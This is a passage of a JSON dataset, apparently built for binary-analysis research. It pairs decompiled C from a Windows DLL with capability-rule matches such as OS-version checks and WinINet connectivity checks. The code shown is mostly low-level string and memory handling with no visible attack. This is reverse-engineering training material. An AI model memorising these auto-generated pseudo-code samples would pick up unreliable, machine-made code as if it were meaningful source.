            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1800065d0(ulong noname_0, ulong arg2, int64_t *arg3, int64_t *arg4)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    code *pcVar3;\n    ulong uVar4;\n    uchar *arg1;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t *arg1_00;\n    int64_t **arg3_00;\n    int64_t **in_stack_00000028;\n    uchar auStack328 [32];\n    uchar *puStack296;\n    uchar *puStack288;\n    uchar uStack280;\n    unkbyte7 Stack279;\n    ulong uStack264;\n    uint64_t uStack256;\n    ulong uStack248;\n    uchar *puStack240;\n    uchar auStack232 [32];\n    uchar auStack200 [128];\n    int64_t *piStack72;\n    int64_t *piStack64;\n    uint64_t uStack48;\n    \n    uStack248 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack328;\n    piStack72 = arg3;\n    piStack64 = arg4;\n    if ((in_stack_00000028[2] == NULL) && (in_stack_00000028 != 0x1801255b8)) {\n        uVar4 = 0x1801255b8;\n        if (7 < *0x1801255d0) {\n            uVar4 = *0x1801255b8;\n        }\n        fcn.180010d70(in_stack_00000028, uVar4, *0x1801255c8);\n    }\n    puStack240 = auStack232;\n    uVar4 = fcn.1800687b0(auStack200);\n    arg3_00 = in_stack_00000028;\n    if (0x7 < in_stack_00000028[3]) {\n        arg3_00 = *in_stack_00000028;\n    }\n    fcn.180068c50(uVar4, auStack232, arg3_00, arg3_00 + in_stack_00000028[2] * 2);\n    fcn.1800686c0(auStack200);\n    uStack264 = CONCAT44(*0x180101914, *0x180101910);\n    uStack256 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack280 = 0;\n    arg1 = &uStack280;\n    fcn.180011120(arg1, 0x1800f462e, 0);\n    puStack288 = auStack232;\n    puStack296 = &uStack280;\n    fcn.180004b90(arg1, arg2, arg3, arg4);\n    if (uStack256 < 0x10) {\ncode_r0x000180006722:\n        uStack264 = CONCAT44(*0x180101914, *0x180101910);\n        uStack256 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack280 = 0;\n        if (0xf < arg3[3]) {\n            iVar5 = *arg3;\n            iVar6 = iVar5;\n            if ((0xfff < arg3[3] + 1U) && (iVar6 = *(iVar5 + -8),  0x1f < (iVar5 - iVar6) - 8U))\n            goto code_r0x000180006848;\n            fcn.18008fb24(iVar6);\n        }\n        arg3[2] = 0;\n        arg3[3] = 0xf;\n        *arg3 = 0;\n        uVar1 = arg4[3];\n        if (uVar1 < 0x10) {\ncode_r0x0001800067bb:\n            arg4[2] = 0;\n            arg4[3] = 0xf;\n            *arg4 = 0;\n            if (in_stack_00000028[3] < 0x8) {\ncode_r0x000180006805:\n                in_stack_00000028[2] = NULL;\n                in_stack_00000028[3] = 0x7;\n                *in_stack_00000028 = 0;\n                fcn.18008fb00(uStack48 ^ auStack328);\n                return;\n            }\n            piVar2 = *in_stack_00000028;\n            arg1_00 = piVar2;\n            if ((in_stack_00000028[3] * 2 + 2U < 0x1000) || (arg1_00 = piVar2[-1],  piVar2 + (-8 - arg1_00) < 0x20)) {\n                fcn.18008fb24(arg1_00);\n                goto code_r0x000180006805;\n            }\n        }\n        else {\n            iVar5 = *arg4;\n            iVar6 = iVar5;\n            if (uVar1 + 1 < 0x1000) {\ncode_r0x0001800067b6:\n                fcn.18008fb24(iVar6);\n                goto code_r0x0001800067bb;\n            }\n            iVar6 = *(iVar5 + -8);\n            if ((iVar5 - iVar6) - 8U < 0x20) goto code_r0x0001800067b6;\n            fcn.1800b3528(iVar5 - iVar6, uVar1 + 0x28);\n        }\n        fcn.1800b3528();\n    }\n    else {\n        iVar6 = CONCAT71(Stack279, uStack280);\n        iVar5 = iVar6;\n        if ((uStack256 + 1 < 0x1000) || (iVar5 = *(iVar6 + -8),  (iVar6 - iVar5) - 8U < 0x20)) {\n            fcn.18008fb24(iVar5);\n            goto code_r0x000180006722;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x000180006848:\n    fcn.1800b3528();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 1384
    },
    "18000685": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180006850(ulong noname_0, ulong arg2, int64_t *arg3, int64_t *arg4)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    uchar *arg1;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong arg2_00;\n    int64_t *in_stack_00000028;\n    uchar auStack200 [32];\n    uchar *puStack168;\n    ulong uStack160;\n    uchar uStack152;\n    unkbyte7 Stack151;\n    ulong uStack136;\n    uint64_t uStack128;\n    ulong uStack120;\n    uchar *puStack112;\n    uchar auStack104 [32];\n    int64_t *piStack72;\n    int64_t *piStack64;\n    uint64_t uStack48;\n    \n    uStack120 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack200;\n    piStack72 = arg3;\n    piStack64 = arg4;\n    if ((in_stack_00000028[2] == 0) && (in_stack_00000028 != 0x1801255b8)) {\n        arg2_00 = 0x1801255b8;\n        if (7 < *0x1801255d0) {\n            arg2_00 = *0x1801255b8;\n        }\n        fcn.180010d70(in_stack_00000028, arg2_00, *0x1801255c8);\n    }\n    puStack112 = auStack104;\n    uStack160 = fcn.18000da90(auStack104, in_stack_00000028);\n    uStack136 = CONCAT44(*0x180101914, *0x180101910);\n    uStack128 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack152 = 0;\n    arg1 = &uStack152;\n    fcn.180011120(arg1, 0x1800f462f, 0);\n    puStack168 = &uStack152;\n    fcn.180004d80(arg1, arg2, arg3, arg4);\n    if (uStack128 < 0x10) {\ncode_r0x00018000696e:\n        uStack136 = CONCAT44(*0x180101914, *0x180101910);\n        uStack128 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack152 = 0;\n        if (7 < arg3[3]) {\n            iVar3 = *arg3;\n            iVar4 = iVar3;\n            if ((0xfff < arg3[3] * 2 + 2U) && (iVar4 = *(iVar3 + -8),  0x1f < (iVar3 - iVar4) - 8U))\n            goto code_r0x000180006a98;\n            fcn.18008fb24(iVar4);\n        }\n        arg3[2] = 0;\n        arg3[3] = 7;\n        *arg3 = 0;\n        uVar1 = arg4[3];\n        if (uVar1 < 0x10) {\ncode_r0x000180006a0b:\n            arg4[2] = 0;\n            arg4[3] = 0xf;\n            *arg4 = 0;\n            if (in_stack_00000028[3] < 8) {\ncode_r0x000180006a56:\n                in_stack_00000028[2] = 0;\n                in_stack_00000028[3] = 7;\n                *in_stack_00000028 = 0;\n                fcn.18008fb00(uStack48 ^ auStack200);\n                return;\n            }\n            iVar3 = *in_stack_00000028;\n            iVar4 = iVar3;\n            if ((in_stack_00000028[3] * 2 + 2U < 0x1000) || (iVar4 = *(iVar3 + -8),  (iVar3 - iVar4) - 8U < 0x20)) {\n                fcn.18008fb24(iVar4);\n                goto code_r0x000180006a56;\n            }\n        }\n        else {\n            iVar3 = *arg4;\n            iVar4 = iVar3;\n            if (uVar1 + 1 < 0x1000) {\ncode_r0x000180006a06:\n                fcn.18008fb24(iVar4);\n                goto code_r0x000180006a0b;\n            }\n            iVar4 = *(iVar3 + -8);\n            if ((iVar3 - iVar4) - 8U < 0x20) goto code_r0x000180006a06;\n            fcn.1800b3528(iVar3 - iVar4, uVar1 + 0x28);\n        }\n        fcn.1800b3528();\n    }\n    else {\n        iVar4 = CONCAT71(Stack151, uStack152);\n        iVar3 = iVar4;\n        if ((uStack128 + 1 < 0x1000) || (iVar3 = *(iVar4 + -8),  (iVar4 - iVar3) - 8U < 0x20)) {\n            fcn.18008fb24(iVar3);\n            goto code_r0x00018000696e;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x000180006a98:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 1244
    },
    "1800078f": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1800078f0(ulong noname_0, int64_t **arg2, int64_t **arg3)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    ulong uVar3;\n    uchar *puVar4;\n    int64_t *arg1;\n    int64_t *piVar5;\n    int64_t **ppiVar6;\n    uchar *puVar7;\n    int64_t iVar8;\n    int64_t arg3_00;\n    int64_t iVar9;\n    ushort *arg3_01;\n    uchar *puVar10;\n    uchar *puVar11;\n    ulong var_60h;\n    ulong var_68h;\n    ulong var_70h;\n    uchar auStack408 [32];\n    uchar uStack376;\n    unkbyte7 Stack375;\n    int64_t iStack360;\n    uint64_t uStack352;\n    uchar uStack344;\n    unkbyte7 Stack343;\n    ulong uStack328;\n    uint64_t uStack320;\n    uchar uStack312;\n    unkbyte7 Stack311;\n    ulong uStack296;\n    uint64_t uStack288;\n    ushort uStack280;\n    unkbyte6 Stack278;\n    int64_t iStack264;\n    uint64_t uStack256;\n    uchar uStack248;\n    unkbyte7 Stack247;\n    ulong uStack232;\n    uint64_t uStack224;\n    ulong uStack216;\n    uchar *puStack208;\n    uchar *puStack200;\n    uchar auStack184 [48];\n    ulong var_80h;\n    ulong var_70h_2;\n    ulong var_68h_2;\n    ulong var_60h_2;\n    ulong var_bp_50h;\n    ulong var_48h;\n    ulong var_40h;\n    ulong var_38h;\n    int64_t **var_bp_30h;\n    int64_t **ppiStack48;\n    uint64_t var_bp_20h;\n    \n    uStack216 = 0xfffffffffffffffe;\n    var_bp_20h = *0x180123080 ^ auStack408;\n    puStack208 = &uStack376;\n    iVar9 = 0x1801254f8;\n    if (0xf < *0x180125510) {\n        iVar9 = *0x1801254f8;\n    }\n    iStack360 = 0;\n    uStack352 = 0xf;\n    uStack376 = 0;\n    iVar8 = -1;\n    arg3_00 = -1;\n    do {\n        arg3_00 = arg3_00 + 1;\n    } while (*(iVar9 + arg3_00) != '\\0');\n    var_bp_30h = arg2;\n    ppiStack48 = arg3;\n    fcn.180011120(&uStack376, iVar9, arg3_00);\n    puStack200 = &uStack376;\n    ppiVar6 = arg3;\n    if (0x7 < arg3[3]) {\n        ppiVar6 = *arg3;\n    }\n    iStack264 = 0;\n    uStack256 = 7;\n    uStack280 = 0;\n    iVar9 = -1;\n    do {\n        iVar9 = iVar9 + 1;\n    } while (*(ppiVar6 + iVar9 * 2) != 0);\n    fcn.180010d70(&uStack280, ppiVar6, iVar9);\n    uVar3 = fcn.1800687b0(auStack184);\n    arg3_01 = &uStack280;\n    if (7 < uStack256) {\n        arg3_01 = CONCAT62(Stack278, uStack280);\n    }\n    fcn.180068c50(uVar3, &uStack248, arg3_01, arg3_01 + iStack264);\n    fcn.1800686c0(auStack184);\n    ppiVar6 = arg2;\n    if (0xf < arg2[3]) {\n        ppiVar6 = *arg2;\n    }\n    uStack296 = CONCAT44(*0x180101914, *0x180101910);\n    uStack288 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack312 = 0;\n    do {\n        iVar8 = iVar8 + 1;\n    } while (*(ppiVar6 + iVar8) != '\\0');\n    fcn.180011120(&uStack312, ppiVar6, iVar8);\n    uStack328 = CONCAT44(*0x180101914, *0x180101910);\n    uStack320 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack344 = 0;\n    fcn.180011120(&uStack344, 0x1800f4700, 0xb);\n    if (iStack360 == 0) {\n        uVar3 = 0x1801255d8;\n        if (0xf < *0x1801255f0) {\n            uVar3 = *0x1801255d8;\n        }\n        fcn.180011120(&uStack376, uVar3, *0x1801255e8);\n    }\n    puVar11 = &uStack376;\n    if (0xf < uStack352) {\n        puVar11 = CONCAT71(Stack375, uStack376);\n    }\n    puVar10 = &uStack248;\n    if (0xf < uStack224) {\n        puVar10 = CONCAT71(Stack247, uStack248);\n    }\n    puVar7 = &uStack312;\n    if (0xf < uStack288) {\n        puVar7 = CONCAT71(Stack311, uStack312);\n    }\n    puVar4 = &uStack344;\n    if (0xf < uStack320) {\n        puVar4 = CONCAT71(Stack343, uStack344);\n    }\n    (**0x1800de490)(puVar4, puVar7, puVar10, puVar11);\n    if (uStack352 < 0x10) {\ncode_r0x000180007b17:\n        iStack360 = 0;\n        uStack352 = 0xf;\n        uStack376 = 0;\n        if (0xf < uStack320) {\n            iVar8 = CONCAT71(Stack343, uStack344);\n            iVar9 = iVar8;\n            if ((uStack320 + 1 < 0x1000) || (iVar9 = *(iVar8 + -8),  (iVar8 - iVar9) - 8U < 0x20)) {\n                fcn.18008fb24(iVar9);\n                goto code_r0x000180007b67;\n            }\n            goto code_r0x000180007d21;\n        }\ncode_r0x000180007b67:\n        uStack328 = CONCAT44(*0x180101914, *0x180101910);\n        uStack320 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack344 = 0;\n        if (0xf < uStack288) {\n            iVar8 = CONCAT71(Stack311, uStack312);\n            iVar9 = iVar8;\n            if ((uStack288 + 1 < 0x1000) || (iVar9 = *(iVar8 + -8),  (iVar8 - iVar9) - 8U < 0x20)) {\n                fcn.18008fb24(iVar9);\n                goto code_r0x000180007bb7;\n            }\n            goto code_r0x000180007d27;\n        }\ncode_r0x000180007bb7:\n        uStack296 = CONCAT44(*0x180101914, *0x180101910);\n        uStack288 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack312 = 0;\n        if (uStack224 < 0x10) {\ncode_r0x000180007c05:\n            uStack232 = CONCAT44(*0x180101914, *0x180101910);\n            uStack224 = CONCAT44(*0x18010191c, *0x180101918);\n            uStack248 = 0;\n            if (7 < uStack256) {\n                iVar8 = CONCAT62(Stack278, uStack280);\n                iVar9 = iVar8;\n                if ((0xfff < uStack256 * 2 + 2) && (iVar9 = *(iVar8 + -8),  0x1f < (iVar8 - iVar9) - 8U))\n                goto code_r0x000180007d33;\n                fcn.18008fb24(iVar9);\n            }\n            piVar1 = arg2[3];\n            if (piVar1 < 0x10) {\ncode_r0x000180007c91:\n                arg2[2] = NULL;\n                arg2[3] = 0xf;\n                *arg2 = 0;\n                if (arg3[3] < 0x8) {\ncode_r0x000180007cdb:\n                    arg3[2] = NULL;\n                    arg3[3] = 0x7;\n                    *arg3 = 0;\n                    fcn.18008fb00(var_bp_20h ^ auStack408);\n                    return;\n                }\n                piVar1 = *arg3;\n                piVar5 = piVar1;\n                if ((arg3[3] * 2 + 2U < 0x1000) || (piVar5 = piVar1[-1],  piVar1 + (-8 - piVar5) < 0x20)) {\n                    fcn.18008fb24(piVar5);\n                    goto code_r0x000180007cdb;\n                }\n            }\n            else {\n                piVar5 = *arg2;\n                arg1 = piVar5;\n                if (piVar1 + 1U < 0x1000) {\ncode_r0x000180007c8c:\n                    fcn.18008fb24(arg1);\n                    goto code_r0x000180007c91;\n                }\n                arg1 = piVar5[-1];\n                if ((piVar5 - arg1) - 8U < 0x20) goto code_r0x000180007c8c;\n                fcn.1800b3528(piVar5 - arg1, piVar1 + 5);\n            }\n            fcn.1800b3528();\n            goto code_r0x000180007d1b;\n        }\n        iVar8 = CONCAT71(Stack247, uStack248);\n        iVar9 = iVar8;\n        if ((uStack224 + 1 < 0x1000) || (iVar9 = *(iVar8 + -8),  (iVar8 - iVar9) - 8U < 0x20)) {\n            fcn.18008fb24(iVar9);\n            goto code_r0x000180007c05;\n        }\n    }\n    else {\n        iVar8 = CONCAT71(Stack375, uStack376);\n        iVar9 = iVar8;\n        if ((uStack352 + 1 < 0x1000) || (iVar9 = *(iVar8 + -8),  (iVar8 - iVar9) - 8U < 0x20)) {\n            fcn.18008fb24(iVar9);\n            goto code_r0x000180007b17;\n        }\ncode_r0x000180007d1b:\n        fcn.1800b3528();\ncode_r0x000180007d21:\n        fcn.1800b3528();\ncode_r0x000180007d27:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x000180007d33:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 2605
    },
    "180007d4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_fh\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_9h\n\nvoid fcn.180007d40(ulong noname_0, int64_t *arg2)\n\n{\n    code *pcVar1;\n    uchar *arg1;\n    int64_t iVar2;\n    char in_R8B;\n    int64_t iVar3;\n    ulong var_fh;\n    ulong var_17h;\n    ulong var_37h;\n    ulong var_3fh;\n    uchar auStack232 [32];\n    uchar *puStack200;\n    ulong uStack192;\n    uchar uStack184;\n    unkbyte7 Stack183;\n    ulong uStack168;\n    uint64_t uStack160;\n    uchar uStack152;\n    unkbyte7 Stack151;\n    ulong uStack136;\n    uint64_t uStack128;\n    uchar uStack120;\n    unkbyte7 Stack119;\n    uchar auStack104 [7];\n    uint64_t var_59h;\n    uchar auStack88 [7];\n    int64_t var_49h;\n    ulong var_41h;\n    ulong var_39h;\n    ulong var_29h;\n    int64_t *var_21h;\n    uint64_t var_19h;\n    ulong var_9h;\n    ulong var_1h;\n    \n    _auStack88 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack232;\n    unique0x00003100 = &var_41h + 1;\n    unique0x100002c2 = arg2;\n    uStack192 = fcn.18000de50(&var_41h + 1, 0x1801254f8);\n    iVar2 = 0x1800f46fc;\n    if (in_R8B != '\\0') {\n        iVar2 = 0x1800f46ec;\n    }\n    uStack136 = CONCAT44(*0x180101914, *0x180101910);\n    uStack128 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack152 = 0;\n    iVar3 = -1;\n    do {\n        iVar3 = iVar3 + 1;\n    } while (*(iVar2 + iVar3) != '\\0');\n    fcn.180011120(&uStack152, iVar2, iVar3);\n    uStack168 = CONCAT44(*0x180101914, *0x180101910);\n    uStack160 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack184 = 0;\n    arg1 = &uStack184;\n    fcn.180011120(arg1, 0x1800f4710, 0xb);\n    puStack200 = &uStack152;\n    fcn.180004b90(arg1, &uStack120, &uStack184, arg2);\n    if (stack0xffffffffffffffa0 < 0x10) {\ncode_r0x000180007e81:\n        _auStack104 = CONCAT44(*0x180101914, *0x180101910);\n        unique0x100001c8 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack120 = 0;\n        if (0xf < uStack160) {\n            iVar3 = CONCAT71(Stack183, uStack184);\n            iVar2 = iVar3;\n            if ((0xfff < uStack160 + 1) && (iVar2 = *(iVar3 + -8),  0x1f < (iVar3 - iVar2) - 8U))\n            goto code_r0x000180007fa7;\n            fcn.18008fb24(iVar2);\n        }\n        uStack168 = CONCAT44(*0x180101914, *0x180101910);\n        uStack160 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack184 = 0;\n        if (uStack128 < 0x10) {\ncode_r0x000180007f19:\n            uStack136 = CONCAT44(*0x180101914, *0x180101910);\n            uStack128 = CONCAT44(*0x18010191c, *0x180101918);\n            uStack152 = 0;\n            if (arg2[3] < 0x10) {\ncode_r0x000180007f60:\n                arg2[2] = 0;\n                arg2[3] = 0xf;\n                *arg2 = 0;\n                fcn.18008fb00(stack0xffffffffffffffe0 ^ auStack232);\n                return;\n            }\n            iVar2 = *arg2;\n            iVar3 = iVar2;\n            if ((arg2[3] + 1U < 0x1000) || (iVar3 = *(iVar2 + -8),  (iVar2 - iVar3) - 8U < 0x20)) {\n                fcn.18008fb24(iVar3);\n                goto code_r0x000180007f60;\n            }\n        }\n        else {\n            iVar3 = CONCAT71(Stack151, uStack152);\n            iVar2 = iVar3;\n            if (uStack128 + 1 < 0x1000) {\ncode_r0x000180007f14:\n                fcn.18008fb24(iVar2);\n                goto code_r0x000180007f19;\n            }\n            iVar2 = *(iVar3 + -8);\n            if ((iVar3 - iVar2) - 8U < 0x20) goto code_r0x000180007f14;\n            fcn.1800b3528(uStack168, iVar2, uStack128 + 0x28);\n        }\n        fcn.1800b3528();\n    }\n    else {\n        iVar3 = CONCAT71(Stack119, uStack120);\n        iVar2 = iVar3;\n        if ((stack0xffffffffffffffa0 + 1 < 0x1000) || (iVar2 = *(iVar3 + -8),  (iVar3 - iVar2) - 8U < 0x20)) {\n            fcn.18008fb24(iVar2);\n            goto code_r0x000180007e81;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x000180007fa7:\n    fcn.1800b3528();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 1439
    },
    "180007fb": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180007fb0(ulong noname_0, int64_t **arg2)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    uint64_t uVar3;\n    int64_t **arg1;\n    uchar *puVar4;\n    int64_t *piVar5;\n    int64_t iVar6;\n    ulong arg2_00;\n    int64_t **ppiVar7;\n    char in_R8B;\n    int64_t iVar8;\n    uchar *puVar9;\n    int64_t **ppiVar10;\n    uchar auStack184 [32];\n    uchar uStack152;\n    unkbyte7 Stack151;\n    ulong uStack136;\n    uint64_t uStack128;\n    uchar uStack120;\n    unkbyte7 Stack119;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    ulong uStack88;\n    uchar *puStack80;\n    int64_t **ppiStack72;\n    uchar auStack64 [32];\n    int64_t **ppiStack32;\n    uint64_t uStack24;\n    \n    uStack88 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack184;\n    puStack80 = auStack64;\n    ppiStack32 = arg2;\n    arg1 = fcn.18000de50(auStack64, 0x1801254f8);\n    iVar6 = 0x1800f471c;\n    if (in_R8B != '\\0') {\n        iVar6 = 0x1800f470c;\n    }\n    uStack104 = *0x180101910;\n    uStack100 = *0x180101914;\n    uStack96 = *0x180101918;\n    uStack92 = *0x18010191c;\n    uStack120 = 0;\n    iVar8 = -1;\n    do {\n        iVar8 = iVar8 + 1;\n    } while (*(iVar6 + iVar8) != '\\0');\n    ppiStack72 = arg1;\n    fcn.180011120(&uStack120, iVar6, iVar8);\n    uStack136 = CONCAT44(*0x180101914, *0x180101910);\n    uStack128 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack152 = 0;\n    fcn.180011120(&uStack152, 0x1800f4720, 0xb);\n    if ((arg1[2] == NULL) && (arg1 != 0x1801255d8)) {\n        arg2_00 = 0x1801255d8;\n        if (0xf < *0x1801255f0) {\n            arg2_00 = *0x1801255d8;\n        }\n        fcn.180011120(arg1, arg2_00, *0x1801255e8);\n    }\n    ppiVar10 = arg1;\n    if (0xf < arg1[3]) {\n        ppiVar10 = *arg1;\n    }\n    puVar9 = &uStack120;\n    if (0xf < CONCAT44(uStack92, uStack96)) {\n        puVar9 = CONCAT71(Stack119, uStack120);\n    }\n    ppiVar7 = arg2;\n    if (0xf < arg2[3]) {\n        ppiVar7 = *arg2;\n    }\n    puVar4 = &uStack152;\n    if (0xf < uStack128) {\n        puVar4 = CONCAT71(Stack151, uStack152);\n    }\n    (**0x1800de490)(puVar4, ppiVar7, puVar9, ppiVar10);\n    if (0xf < arg1[3]) {\n        piVar1 = *arg1;\n        piVar5 = piVar1;\n        if ((0xfff < arg1[3] + 1U) && (piVar5 = piVar1[-1],  0x1f < piVar1 + (-8 - piVar5))) goto code_r0x00018000823b;\n        fcn.18008fb24(piVar5);\n    }\n    arg1[2] = NULL;\n    arg1[3] = 0xf;\n    *arg1 = 0;\n    if (uStack128 < 0x10) {\ncode_r0x000180008172:\n        uStack136 = CONCAT44(*0x180101914, *0x180101910);\n        uStack128 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack152 = 0;\n        uVar3 = CONCAT44(uStack92, uStack96);\n        if (uVar3 < 0x10) {\ncode_r0x0001800081bf:\n            if (arg2[3] < 0x10) {\ncode_r0x0001800081f5:\n                arg2[2] = NULL;\n                arg2[3] = 0xf;\n                *arg2 = 0;\n                fcn.18008fb00(uStack24 ^ auStack184);\n                return;\n            }\n            piVar1 = *arg2;\n            piVar5 = piVar1;\n            if ((arg2[3] + 1U < 0x1000) || (piVar5 = piVar1[-1],  piVar1 + (-8 - piVar5) < 0x20)) {\n                fcn.18008fb24(piVar5);\n                goto code_r0x0001800081f5;\n            }\n        }\n        else {\n            iVar8 = CONCAT71(Stack119, uStack120);\n            iVar6 = iVar8;\n            if (uVar3 + 1 < 0x1000) {\ncode_r0x0001800081b9:\n                fcn.18008fb24(iVar6);\n                goto code_r0x0001800081bf;\n            }\n            iVar6 = *(iVar8 + -8);\n            if ((iVar8 - iVar6) - 8U < 0x20) goto code_r0x0001800081b9;\n            fcn.1800b3528(uStack136, iVar6, uVar3 + 0x28);\n        }\n        fcn.1800b3528();\n    }\n    else {\n        iVar8 = CONCAT71(Stack151, uStack152);\n        iVar6 = iVar8;\n        if ((uStack128 + 1 < 0x1000) || (iVar6 = *(iVar8 + -8),  (iVar8 - iVar6) - 8U < 0x20)) {\n            fcn.18008fb24(iVar6);\n            goto code_r0x000180008172;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x00018000823b:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 1541
    },
    "180008d4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180008d40(ulong noname_0, ulong arg2, int64_t **arg3)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    ulong *puVar5;\n    int64_t iVar6;\n    int64_t *piVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    ulong *puVar10;\n    uchar auStack136 [32];\n    uint uStack104;\n    int64_t **ppiStack96;\n    ulong uStack88;\n    int64_t **ppiStack80;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    uint64_t uStack48;\n    uint64_t var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    uStack88 = 0xfffffffffffffffe;\n    var_20h = *0x180123080 ^ auStack136;\n    iVar6 = 0;\n    var_30h = 0;\n    uStack48 = 0xf;\n    var_40h._0_1_ = 0;\n    ppiStack80 = arg3;\n    fcn.180010fa0(&var_40h, 0x7fff);\n    ppiStack96 = arg3;\n    if (0xf < arg3[3]) {\n        ppiStack96 = *arg3;\n    }\n    puVar10 = &var_40h;\n    if (0xf < uStack48) {\n        puVar10 = CONCAT71(var_40h._1_7_, var_40h);\n    }\n    uStack104 = 0x7fff;\n    uVar4 = (**0x1800de478)(0, 0x1800f4656, 0x1800f4653, puVar10);\n    if (uVar4 == 0) {\n        if (0xf < uStack48) {\n            iVar3 = CONCAT71(var_40h._1_7_, var_40h);\n            iVar6 = iVar3;\n            if ((0xfff < uStack48 + 1) && (iVar6 = *(iVar3 + -8),  0x1f < (iVar3 - iVar6) - 8U)) {\ncode_r0x000180008f92:\n                fcn.1800b3528(iVar6, uStack48 + 0x28);\n                goto code_r0x000180008f98;\n            }\n            fcn.18008fb24(iVar6);\n        }\n        var_30h = 0;\n        uStack48 = 0xf;\n        var_40h._0_1_ = 0;\n        if (0xf < arg3[3]) {\n            piVar1 = *arg3;\n            piVar7 = piVar1;\n            if ((0xfff < arg3[3] + 1U) && (piVar7 = piVar1[-1],  0x1f < piVar1 + (-8 - piVar7))) {\ncode_r0x000180008f98:\n                fcn.1800b3528();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            fcn.18008fb24(piVar7);\n        }\n    }\n    else {\n        uVar8 = uVar4;\n        puVar10 = CONCAT71(var_40h._1_7_, var_40h);\n        uVar9 = uStack48;\n        do {\n            puVar5 = &var_40h;\n            if (0xf < uVar9) {\n                puVar5 = puVar10;\n            }\n            if (*(iVar6 + puVar5) == '\\0') {\n                puVar5 = &var_40h;\n                if (0xf < uVar9) {\n                    puVar5 = puVar10;\n                }\n                *(iVar6 + puVar5) = 0x2c;\n                puVar10 = CONCAT71(var_40h._1_7_, var_40h);\n                uVar9 = uStack48;\n            }\n            iVar6 = iVar6 + 1;\n            uVar8 = uVar8 - 1;\n        } while (uVar8 != 0);\n        puVar5 = &var_40h;\n        if (0xf < uVar9) {\n            puVar5 = puVar10;\n        }\n        iVar6 = -1;\n        do {\n            iVar6 = iVar6 + 1;\n        } while (*(puVar5 + iVar6) != '\\0');\n        fcn.180011120(arg2, puVar5, iVar6);\n        if (0xf < uStack48) {\n            iVar3 = CONCAT71(var_40h._1_7_, var_40h);\n            iVar6 = iVar3;\n            if ((0xfff < uStack48 + 1) && (iVar6 = *(iVar3 + -8),  0x1f < (iVar3 - iVar6) - 8U))\n            goto code_r0x000180008f92;\n            fcn.18008fb24(iVar6);\n        }\n        var_30h = 0;\n        uStack48 = 0xf;\n        var_40h._0_1_ = 